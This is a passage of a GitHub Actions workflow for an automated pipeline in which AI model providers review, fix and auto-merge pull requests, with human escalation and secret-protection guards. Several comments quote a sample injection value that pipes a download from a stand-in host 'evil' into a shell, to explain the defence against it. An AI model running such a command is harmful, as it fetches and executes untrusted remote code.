          # derivation now feeds the SHA-bound pre-arm AUDIT trail instead of a human park.
          SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
          # Issue #153: the routing's own security match_labels keywords (union with the builtin
          # set, resolved once above). The arm re-reads LIVE PR + source-issue labels against
          # these so a security label added DURING the review still lands in the audit trail.
          SECURITY_KEYWORDS_B64: ${{ needs.resolve.outputs.security_keywords }}
          # Catalog-controlled providers reach this contents:write + PROVENANCE_SALT arm job via env
          # ONLY — never interpolated into the run: shell source, where `x"; curl evil|sh; echo "`
          # would execute (issue #199). worker-pr.py ready-and-arm asserts reviewer != implementer.
          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
          REVIEWER_PROVIDER: ${{ needs.claim.outputs.provider }}
          # [#657] The arm REFUSES this class (worker-pr.ready_and_arm): a self-attested record
          # cannot authorise a merge, because the cross-provider assertion below is derived by
          # inverting a field the implementer wrote about itself.
          SELF_ATTESTED: ${{ needs.resolve.outputs.self_attested }}
        run: |
          set -euo pipefail
          args=(
            ready-and-arm
            --repo "${{ inputs.target_repo }}"
            --pr "${{ inputs.pr_number }}"
            --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
            --impl-provider "$IMPL_PROVIDER"
            --impl-account-h "${{ needs.resolve.outputs.impl_account_h }}"
            --reviewer-provider "$REVIEWER_PROVIDER"
            --arm "${{ needs.resolve.outputs.arm_auto_merge }}"
            --issue "${{ needs.resolve.outputs.issue }}"
            --bot-login "${{ needs.resolve.outputs.pr_author }}"
            --reviewed-base "${{ needs.resolve.outputs.base_ref }}"
          )
          [[ "$SELF_ATTESTED" == "true" ]] && args+=(--self-attested)
          while IFS= read -r p; do
            [[ -n "$p" ]] && args+=(--surface-path "$p")
          done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
            | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
          while IFS= read -r k; do
            [[ -n "$k" ]] && args+=(--security-keyword "$k")
          done < <(printf '%s' "${SECURITY_KEYWORDS_B64:-W10=}" | base64 -d \
            | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
          python3 registry/scripts/worker-pr.py "${args[@]}"

      # LAST mutation by design: binding reviewed-sha == head marks this head's review complete;
      # everything before it is re-derivable, so a crash anywhere above re-converges via the
      # sweep instead of permanently skipping an unfinished PR.
      - name: Bind the reviewed sha (terminal marker for this head)
        # sol r7 on #257: step SUCCESS is not enough — the head/base-race paths exit 0 with
        # armed=false after setting review:needs, and binding reviewed-sha there wedges the
        # sweep into skipping the pending re-review. Key on the armed OUTPUT.
        # [round-5 P1] decision == 'hold' is the hold-wins DROP (a human/groom park landed
        # after the review resolved): the outcome applied NOTHING, so reviewed-sha must stay
        # unbound — the sweep re-derives this head once a human clears the park.
        # [issue #156] decision == 'stale' is the head-moved DROP (the live head advanced off
        # the reviewed sha during the run): the outcome applied NOTHING, so reviewed-sha must
        # stay unbound — the sweep re-reviews the current head.
        # [registry #892] `bind_reviewed_sha` is the DECLINED-ARM leg, and it is the routing half
        # of that decline, not a convenience. ready_and_arm refuses the latch when the aggregator
        # at the reviewed head has already CONCLUDED red (arm_complete stays false — nothing was
        # armed), but the review itself completed end to end on this head, so the marker must
        # bind: a bound marker on a drafted review:needs PR is what makes enumerate_review_items
        # fall through to GAP-A and emit needs-ci-fix. Leaving it unbound would re-emit
        # needs-review and spend another cross-provider round on an untouched tree. Deleting this
        # disjunct therefore does not merely skip a marker write — it converts every declined arm
        # into a repeat review round, which is what the paired self-test asserts.
        if: ${{ inputs.mode == 'review' && steps.outcome.outcome == 'success' && steps.outcome.outputs.decision != 'hold' && steps.outcome.outputs.decision != 'stale' && (steps.outcome.outputs.decision != 'arm' || (steps.arm.outcome == 'success' && (steps.arm.outputs.arm_complete == 'true' || steps.arm.outputs.bind_reviewed_sha == 'true'))) }}
        env:
          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
        run: |
          python3 registry/scripts/worker-pr.py reviewed-sha set \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --sha "${{ needs.run.outputs.reviewed_sha }}"

      - name: Apply the fix outcome (host-side markers, labels, escalation)
        if: ${{ inputs.mode == 'fix' && needs.run.outputs.fix_done == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_ALERT_TOKEN: ${{ github.token }}
          ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
          ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
          MAINTAINER_HANDLE: jeswr
          # Catalog-controlled model alias reaches this write-scoped App-token job via env ONLY —
          # never interpolated into the run: shell source, where `x"; curl evil|sh; echo "` would
          # execute (issue #199, same class as the provider paths).
          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
        # [issue #91 review r2] `--pushed`/`--reviewed-sha` come from the isolated `publish` job
        # now. A SKIPPED or refused publish yields an EMPTY output, so `pushed` is normalised to
        # the literal 'false' the recorder expects — the same value the old in-run push step
        # produced whenever the gate did not pass.
        run: |
          python3 registry/scripts/worker-pr.py fix-outcome \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --round "${{ inputs.review_round }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --bot-login "${{ needs.resolve.outputs.pr_author }}" \
            --model "$MODEL_ALIAS" \
            --injection "${{ needs.run.outputs.injection_detected == 'true' && 'true' || 'false' }}" \
            --made-changes "${{ needs.run.outputs.fix_made_changes == 'true' && 'true' || 'false' }}" \
            --gate-outcome "${{ needs.run.outputs.gate_outcome }}" \
            --pushed "${{ needs.publish.outputs.pushed == 'true' && 'true' || 'false' }}" \
            --reviewed-sha "${{ needs.publish.outputs.pushed == 'true' && needs.publish.outputs.pushed_sha || needs.resolve.outputs.head_sha }}" \
            --issue "${{ needs.resolve.outputs.issue }}"

      # Issue #560 — WRONG-LANE SPIN CLOSURE. stage-verdict refused to seed the fixer because no
      # recorded verdict is bound to the live head (a legacy pre-#156 unbound record, a head that
      # moved under an update-branch/main merge, or an envelope naming another repo/PR/round), so
      # this run produced NOTHING. Leaving review:changes on the PR kept it in the FIX lane's bucket
      # while only the REVIEW lane can mint the head-bound verdict the fixer needs: live 2026-07-24,
      # sparq#3523/#3542/#3572/#3573/#3608 each launched a fix run per ~8min tick from 08:02Z, every
      # one completing "success" on `deferring to a fresh review` (~35 wasted runs/hour, each burning
      # an account claim + a runner) until a human flipped the five labels. Hand the PR over here.
      #
      # This is a MACHINE LANE transition, NOT a park: worker-pr.py reads the live hold surface first
      # (BOTH machine park labels — review:parked on the PR and status:parked on the source issue —
      # plus the human holds), RE-READS it immediately before writing, and ABORTS the whole hand-over
      # if any of them landed in between: the park WINS (issue #555) and is never converted into a
      # human-owned review:needs-user. Every abort is decided BEFORE the first write, so it leaves no
      # trace at all (#584 follow-up finding 2). It is idempotent, so a re-run or a concurrent claim
      # that already handed over writes nothing. The fix CLAIM itself (the `fix:<repo>#<pr>` lease
      # enumerate_review_items single-flights on) is released unconditionally by the `release` job
      # below, which does not depend on this job — the slot is free before the next tick.
      #
      # A live `review:pass` STANDS THE HAND-OVER DOWN entirely (#584 follow-up finding 1) — no lane
      # write, no marker write, no comment. The fix lane admits on a concluded-RED gate ALONE too
      # (GAP-A `needs-ci-fix`, review-state-agnostic), so a NON-DRAFT, ARMED, passed PR reaches this
      # step; retracting its reviewed-sha marker is precisely what makes dispatch-claim's disarm net
      # read `marker != head` on an armed PR as a safety violation and disable-auto + dequeue +
      # REDRAFT it. A passed PR has nothing to hand to the review lane either — the pass IS the
      # verdict.
      #
      # `--head-sha` is REQUIRED and load-bearing (round-2 finding 1): the label flip ALONE only
      # relocates the spin, because a completed request-changes review left `sparq-reviewed-sha ==
      # head` and a DRAFTED PR carrying that marker is not re-emitted as needs-review — a green gate
      # instead dispatches a review run whose resolve step exits `already_done` with no work done,
      # and a pending gate leaves NO lane owning the PR. This is the head the verdict was proved NOT
      # bound to, so its reviewed-sha assertion is retracted and the review lane provably takes over.
      - name: Hand a deferred fix back to the review lane (unbound/stale verdict)
        if: ${{ inputs.mode == 'fix' && needs.run.outputs.verdict_staged == 'false' && needs.run.outputs.verdict_stale_reason != '' }}
        env:
          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
          # Script-authored value, but it reaches the CLI via env like every other non-literal
          # (issue #199): never interpolated into this `run:` shell source.
          STALE_REASON: ${{ needs.run.outputs.verdict_stale_reason }}
        run: |
          python3 registry/scripts/worker-pr.py fix-lane-defer \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --issue "${{ needs.resolve.outputs.issue }}" \
            --head-sha "${{ needs.resolve.outputs.head_sha }}" \
            --stale-reason "$STALE_REASON"

  # Escalate an unresolvable inverse chain to a human immediately (never silent-queue): if the
  # routing catalog cannot resolve a concrete model for this direction, a human must decide.
  unresolvable:
    name: Escalate unresolvable model chain
    needs: resolve
    if: ${{ needs.resolve.outputs.unresolvable == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
    # rationale on the `claim` job in dispatch.yml.
    environment: dispatch-secrets
    permissions:
      contents: read
      issues: write   # write: ops-alert upsert in the registry
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Mint App token for the escalation
        id: app-token
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-issues: write
          permission-pull-requests: write

      - name: Route the PR and its source issue to a human
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_ALERT_TOKEN: ${{ github.token }}
          # Privacy routing (locked decision 22c): maintainer-set ALERT_REPO sends the ops alert
          # to a private repo; unset falls back to the registry.
          ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
          ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
          MAINTAINER_HANDLE: jeswr
        run: |
          # [registry #869] --park-cause makes this park's stop reason MACHINE-READABLE. Without
          # it the only record of why this PR sits on the human terminal is the English --reason
          # below, and park_policy's prose classifier is the only thing that can read it. The
          # cause is the taxonomy's own `routing-unresolvable`; worker-pr's CLI seam refuses any
          # cause that disagrees with the (default `question`) --park-class, so this cannot
          # silently become a capacity receipt on a review:needs-user park.
          python3 registry/scripts/worker-pr.py needs-user \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --issue "${{ needs.resolve.outputs.issue }}" \
            --park-cause routing-unresolvable \
            --reason "the ${{ inputs.mode }} model chain for a ${{ needs.resolve.outputs.impl_provider }}-implemented PR is unresolvable in the target routing (no concrete provider model)"

  # Model-access health record (registry #32): consumes the review/fix model exit CLASS (success OR
  # any failure) into the registry health ledger. A SEPARATE always()-guarded job — like the worker
  # `model_health` job — because the `run` job executes hostile target code host-side in fix mode
  # (the cargo gate): no registry-write token may be co-located there. Runs NO target code, salts
  # the raw handle before it reaches the ledger, and never fails the pipeline.
  model_health:
    name: Record model-access health (no target code runs here)
    if: ${{ always() && needs.claim.outputs.acquired == 'true' && needs.run.outputs.exit_class != '' }}
    needs: [resolve, claim, run]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT, which lives in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
    # rationale on the `claim` job in dispatch.yml.
    environment: dispatch-secrets
    permissions:
      contents: write   # CAS-append data/model-health.json (on the `ledger` branch) via github.token
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Append the model-access health record (salted account hash only)
        env:
          GH_TOKEN: ${{ github.token }}
          REGISTRY_REPO: ${{ github.repository }}
          # Raw handle + salt via env only (argv is echoed into public logs); the script salts the
          # handle so only the 16-hex hash is stored. This job runs no target code.
          WORKER_ACCOUNT_HANDLE: ${{ needs.claim.outputs.account }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
          # Catalog-controlled (provider/alias) and provider-derived (reset-hint) fields reach this
          # contents:write + PROVENANCE_SALT job via env ONLY — never in the run: shell source,
          # where `x"; curl evil|sh; echo "` would execute (issue #199). model-health.py record
          # re-validates the provider against {anthropic, openai, fleet}.
          PROVIDER: ${{ needs.claim.outputs.provider }}
          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
          EXIT_CLASS: ${{ needs.run.outputs.exit_class }}
          RESET_HINT: ${{ needs.run.outputs.reset_hint }}
          # The attempt of the run job that PRODUCED the outcome — never this recorder job's own
          # $GITHUB_RUN_ATTEMPT (review round 1 of #425): a recorder-only retry replays the run
          # job's preserved output (same attempt -> the script dedups the replay), while a full
          # re-run re-executes the run job, whose fresh attempt keeps the genuinely new outcome
          # countable. The empty-output fallback below fails toward RECORDING (a rare duplicate
          # beats a silently dropped outcome).
          OUTCOME_ATTEMPT: ${{ needs.run.outputs.outcome_attempt }}
        run: |
          python3 registry/scripts/model-health.py record \
            --provider "$PROVIDER" \
            --model-alias "$MODEL_ALIAS" \
            --exit-class "$EXIT_CLASS" \
            --reset-hint "$RESET_HINT" \
            --run-id "$GITHUB_RUN_ID.${OUTCOME_ATTEMPT:-$GITHUB_RUN_ATTEMPT}"

  release:
    name: Always release the review/fix lease
    if: ${{ always() && needs.claim.outputs.acquired == 'true' }}
    # [issue #91 review r2] `publish` joins the needs for the same reason worker.yml's release
    # waits on its publisher: the push now happens in a later job, and releasing the lease before
    # it lands would let the next dispatch tick re-claim this PR and re-plan against a head the
    # in-flight publisher is about to move.
    needs: [claim, run, publish]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Release CAS lease by claim id
        env:
          GH_TOKEN: ${{ github.token }}
          CLAIM_ID: ${{ needs.claim.outputs.claim_id }}
        run: |
          set -euo pipefail
          [[ "$CLAIM_ID" =~ ^[0-9a-f]{32}$ ]] || { echo '::error::unsafe or missing claim id'; exit 1; }
          python3 registry/scripts/select-and-claim.py \
            --release "$CLAIM_ID" \
            --repo "$GITHUB_REPOSITORY"

  # Doorbell: see worker.yml — GITHUB_TOKEN-initiated runs emit no workflow_run events, so
  # each finished review/fix explicitly re-rings the dispatcher (fix rounds and re-reviews
  # are enumerated by the sweep; this removes the cron-latency floor between rounds).
  doorbell:
    name: doorbell (re-ring dispatcher)
    needs: [release]
    if: ${{ always() }}
    runs-on: ubuntu-latest
    timeout-minutes: 3
    permissions:
      actions: write
    steps:
      - name: Ring dispatch.yml
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh workflow run dispatch.yml -R "$GITHUB_REPOSITORY" || echo "::warning::doorbell ring failed (cron backstop covers this tick)"
